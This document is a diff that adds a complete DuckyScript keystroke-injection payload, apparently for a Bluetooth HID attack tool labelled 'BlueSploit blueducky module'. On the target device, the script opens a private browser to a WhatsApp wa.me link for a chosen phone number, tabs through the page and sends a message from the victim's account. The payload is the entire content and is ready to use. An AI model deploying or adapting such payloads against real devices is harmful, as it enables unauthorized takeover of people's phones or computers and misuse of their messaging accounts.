@@ -1,0 +1,28 @@
+REM Opens browser to wa.me/<NUMBER>, sends test messages
+REM Replace <+NUMBER> with the full E.164 phone number, e.g. +14155551212
+DELAY 500
+ESCAPE
+GUI d
+ALT ESCAPE
+GUI b
+DELAY 700
+PRIVATE_BROWSER
+DELAY 700
+CTRL l
+DELAY 300
+STRING https://wa.me/<+NUMBER>
+DELAY 500
+ENTER
+DELAY 3000
+TAB
+TAB
+TAB
+TAB
+TAB
+ENTER
+DELAY 7000
+STRING test message from BlueSploit blueducky module
+DELAY 500
+TAB
+TAB
+ENTER
